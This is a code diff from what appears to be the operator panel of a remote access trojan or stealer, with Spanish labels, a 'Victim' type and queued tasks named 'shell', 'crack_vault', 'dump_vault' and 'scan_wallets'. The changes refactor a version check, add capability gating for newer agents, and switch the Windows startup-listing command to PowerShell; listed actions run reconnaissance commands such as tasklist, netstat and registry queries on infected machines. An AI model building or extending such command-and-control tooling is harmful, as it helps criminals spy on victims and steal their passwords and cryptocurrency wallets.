@@ -8,6 +8,8 @@ import {
 import type { LucideIcon } from 'lucide-react';
 import type { Victim } from '@/lib/types';
 import { isWindows } from '@/lib/os';
+import { versionAtLeast } from '../../server/lib/agent-compat';
+export { versionAtLeast } from '../../server/lib/agent-compat';
 
 export type TaskName =
   | 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets'
@@ -41,6 +43,8 @@ export type ActionDef = {
   windowsOnly?: boolean;
   /** Versión mínima del agente que entiende la tarea/parámetro. */
   minAgent?: string;
+  /** Capacidad v2 exigida; ausente = acción v1 siempre visible. */
+  capability?: string;
   /** Acción que no encola nada (abre detalle, pestaña o formulario). */
   local?: boolean;
   destructive?: boolean;
@@ -131,7 +135,7 @@ export const ACTIONS: ActionDef[] = [
 
   // Extra
   { id: 'processes', group: 'extra', label: 'Procesos', icon: Cpu, task: 'shell', detail: win('shell · tasklist /v', 'shell · ps aux'), view: { title: 'Procesos', command: (victim) => isWindows(victim.os) ? 'tasklist /v' : 'ps aux' }, resolve: (victim) => shell(isWindows(victim.os) ? 'tasklist /v' : 'ps aux', 60) },
-  { id: 'startup', group: 'extra', label: 'Inicio automático', icon: Rocket, task: 'shell', detail: win('shell · wmic startup list full', 'shell · systemctl list-unit-files'), view: { title: 'Inicio automático', command: (victim) => isWindows(victim.os) ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled' }, resolve: (victim) => shell(isWindows(victim.os) ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled', 60) },
+  { id: 'startup', group: 'extra', label: 'Inicio automático', icon: Rocket, task: 'shell', detail: win('shell · Get-CimInstance Win32_StartupCommand', 'shell · systemctl list-unit-files'), view: { title: 'Inicio automático', command: (victim) => isWindows(victim.os) ? 'powershell -NoP -C "Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User | Format-List"' : 'systemctl list-unit-files --state=enabled' }, resolve: (victim) => shell(isWindows(victim.os) ? 'powershell -NoP -C "Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User | Format-List"' : 'systemctl list-unit-files --state=enabled', 60) },
   { id: 'programs', group: 'extra', label: 'Programas instalados', icon: Boxes, task: 'shell', detail: win('shell · reg query Uninstall', 'shell · dpkg -l'), view: { title: 'Programas instalados', command: (victim) => isWindows(victim.os) ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l' }, resolve: (victim) => shell(isWindows(victim.os) ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l', 90) },
   { id: 'tcp', group: 'extra', label: 'Conexiones TCP', icon: Network, task: 'shell', detail: win('shell · netstat -ano', 'shell · ss -tunap'), view: { title: 'Conexiones TCP', command: (victim) => isWindows(victim.os) ? 'netstat -ano' : 'ss -tunap' }, resolve: (victim) => shell(isWindows(victim.os) ? 'netstat -ano' : 'ss -tunap', 60) },
   { id: 'window', group: 'extra', label: 'Ventana activa', icon: AppWindow, task: 'shell', detail: 'shell · GetForegroundWindow', windowsOnly: true, view: { title: 'Ventana activa', command: () => ACTIVE_WINDOW }, resolve: () => shell(ACTIVE_WINDOW, 30, 'ventana activa') },
@@ -201,19 +205,6 @@ export function actionDetail(action: ActionDef, victim: Victim): string {
   return typeof action.detail === 'function' ? action.detail(victim) : action.detail;
 }
 
-export function versionAtLeast(current: string | undefined, minimum: string): boolean {
-  // 0.3.8 was a local build older than 0.3.7; it lacks the 0.3.7 task set.
-  const raw = current === '0.3.8' ? '0.3.6.99' : current;
-  const parse = (value: string) => value.split('.').map((part) => Number(part.replace(/\D.*/, '')) || 0);
-  const left = parse(raw || '0');
-  const right = parse(minimum);
-  for (let index = 0; index < Math.max(left.length, right.length); index += 1) {
-    if ((left[index] ?? 0) > (right[index] ?? 0)) return true;
-    if ((left[index] ?? 0) < (right[index] ?? 0)) return false;
-  }
-  return true;
-}
-
 /** Acciones que solo leen datos ya cargados o abren pestañas. */
 const OFFLINE_OK = new Set(['open', 'tags', 'explore']);
 
@@ -223,5 +214,6 @@ export function actionReason(action: ActionDef, victim: Victim, context: ActionC
   if (context.offline && !OFFLINE_OK.has(action.id)) return 'equipo sin socket de control';
   if (action.windowsOnly && !context.windows) return 'solo Windows';
   if (action.minAgent && !versionAtLeast(context.agentVersion, action.minAgent)) return `requiere agente ${action.minAgent}`;
+  if (action.capability && !(victim.capabilities ?? []).includes(action.capability)) return `requiere capability ${action.capability}`;
   return action.disabled?.(victim, context) ?? null;
 }
